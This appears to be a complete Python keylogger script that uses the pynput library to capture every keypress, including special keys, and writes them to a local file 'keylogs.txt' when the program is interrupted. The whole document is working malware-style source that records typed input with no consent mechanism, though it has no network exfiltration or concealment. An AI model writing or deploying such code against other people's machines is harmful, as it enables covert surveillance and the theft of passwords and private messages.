from pynput import keyboard

# Global variable to store keystrokes
logged_keys = []

# Define a function to be called when a key is pressed
def on_press(key):
    try:
        # Append the pressed key to the list
        logged_keys.append(key.char)
    except AttributeError:
        # Handle special keys
        logged_keys.append(str(key))

# Define a function to save the logged keys to a file
def save_logs():
    with open("keylogs.txt", "w") as file:
        for key in logged_keys:
            file.write(str(key) + "\n")

# Set up the listener
with keyboard.Listener(on_press=on_press) as listener:
    try:
        # Start listening for keystrokes
        listener.join()
    except KeyboardInterrupt:
        # Save the logged keys when interrupted by Ctrl+C
        save_logs()
